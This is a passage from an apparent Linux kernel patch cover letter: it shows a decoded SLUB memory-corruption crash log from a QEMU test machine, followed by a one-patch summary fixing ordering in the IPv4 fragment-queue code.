[  100.311988] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  100.313541] Call Trace:
[  100.313885]  <TASK>
[  100.314201]  panic (kernel/panic.c:955 (discriminator 1))
[  100.314828]  ? object_err (mm/slub.c:1113 mm/slub.c:1213)
[  100.315344]  check_panic_on_warn (arch/x86/include/asm/atomic.h:85 (discriminator 4) include/linux/atomic/atomic-arch-fallback.h:564 (discriminator 4) include/linux/atomic/atomic-arch-fallback.h:1020 (discriminator 4) include/linux/atomic/atomic-instrumented.h:454 (discriminator 4) kernel/panic.c:527 (discriminator 4))
[  100.315897]  __warn (kernel/panic.c:1081 (discriminator 10))
[  100.316330]  ? object_err (mm/slub.c:1113 mm/slub.c:1213)
[  100.316833]  report_bug (include/linux/context_tracking.h:137 (discriminator 2) include/linux/context_tracking.h:160 (discriminator 2) lib/bug.c:279 (discriminator 2))
[  100.317323]  handle_bug (arch/x86/kernel/traps.c:429)
[  100.317802]  exc_invalid_op (arch/x86/kernel/traps.c:490 (discriminator 1))
[  100.318309]  asm_exc_invalid_op (arch/x86/include/asm/idtentry.h:616)
[  100.318856] RIP: 0010:object_err (mm/slub.c:1113 mm/slub.c:1213)
[  100.319447] Code: 48 c7 c7 88 55 85 83 e8 57 07 db ff 4c 89 e6 48 c7 c7 8b c4 7b 83 e8 48 07 db ff be 01 00 00 00 bf 05 00 00 00 e8 a9 a2 d2 ff <0f> 0b 5b 5d 41 5c 41 5d e9 57 52 68 01 8b 45 58 6a 01 4d 89 e1 41
All code
========
   0:	48 c7 c7 88 55 85 83 	mov    $0xffffffff83855588,%rdi
   7:	e8 57 07 db ff       	call   0xffffffffffdb0763
   c:	4c 89 e6             	mov    %r12,%rsi
   f:	48 c7 c7 8b c4 7b 83 	mov    $0xffffffff837bc48b,%rdi
  16:	e8 48 07 db ff       	call   0xffffffffffdb0763
  1b:	be 01 00 00 00       	mov    $0x1,%esi
  20:	bf 05 00 00 00       	mov    $0x5,%edi
  25:	e8 a9 a2 d2 ff       	call   0xffffffffffd2a2d3
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	5b                   	pop    %rbx
  2d:	5d                   	pop    %rbp
  2e:	41 5c                	pop    %r12
  30:	41 5d                	pop    %r13
  32:	e9 57 52 68 01       	jmp    0x168528e
  37:	8b 45 58             	mov    0x58(%rbp),%eax
  3a:	6a 01                	push   $0x1
  3c:	4d 89 e1             	mov    %r12,%r9
  3f:	41                   	rex.B

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	5b                   	pop    %rbx
   3:	5d                   	pop    %rbp
   4:	41 5c                	pop    %r12
   6:	41 5d                	pop    %r13
   8:	e9 57 52 68 01       	jmp    0x1685264
   d:	8b 45 58             	mov    0x58(%rbp),%eax
  10:	6a 01                	push   $0x1
  12:	4d 89 e1             	mov    %r12,%r9
  15:	41                   	rex.B
[  100.321876] RSP: 0018:ffffc90000127ca0 EFLAGS: 00010246
[  100.322579] RAX: 0000000000000000 RBX: 0000000000000008 RCX: 0000000000000027
[  100.323524] RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffff88813bd21a00
[  100.324469] RBP: ffff88810280d540 R08: 0000000000000000 R09: 0000000000000003
[  100.325411] R10: ffffc90000127b40 R11: ffffffff84583688 R12: ffff88811117ec10
[  100.326358] R13: 0000000000000001 R14: 000000000000006b R15: ffff88811117ec10
[  100.327312]  check_bytes_and_report (mm/slub.c:1322)
[  100.327929]  check_object (mm/slub.c:1489)
[  100.328441]  ? rcu_core (kernel/rcu/tree_stall.h:113 (discriminator 2) kernel/rcu/tree.c:2864 (discriminator 2))
[  100.328921]  free_slab (mm/slub.c:3568 (discriminator 3))
[  100.329384]  kmem_cache_free (include/trace/events/kmem.h:117 (discriminator 1) mm/slub.c:6376 (discriminator 1))
[  100.329918]  rcu_core (kernel/rcu/tree_stall.h:113 (discriminator 2) kernel/rcu/tree.c:2864 (discriminator 2))
[  100.330385]  ? rcu_core (kernel/rcu/rcu_segcblist.h:105 (discriminator 1) kernel/rcu/tree.c:2860 (discriminator 1))
[  100.330862]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:220)
[  100.331512]  ? __schedule (include/linux/hrtimer_rearm.h:17 include/linux/hrtimer_rearm.h:71 kernel/sched/core.c:978 kernel/sched/core.c:7067)
[  100.332026]  handle_softirqs (kernel/softirq.c:596 (discriminator 10))
[  100.332555]  ? __pfx_smpboot_thread_fn (usercopy_64.c:?)
[  100.333185]  run_ksoftirqd (kernel/softirq.c:1076 kernel/softirq.c:1068)
[  100.333667]  smpboot_thread_fn (kernel/smpboot.c:108 (discriminator 17))
[  100.334215]  kthread (kernel/kthread.c:401)
[  100.334636]  ? __pfx_kthread (include/linux/list.h:162)
[  100.335148]  ret_from_fork (arch/x86/kernel/process.c:153)
[  100.335634]  ? __pfx_kthread (include/linux/list.h:162)
[  100.336150]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[  100.336683]  </TASK>
[  100.337130] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  inet: frags: publish queues before arming timer

 net/ipv4/inet_fragment.c | 10 +++++-----
 1 file changed, 5 insertions(+), 5 deletions(-)

-- 
2.43.0
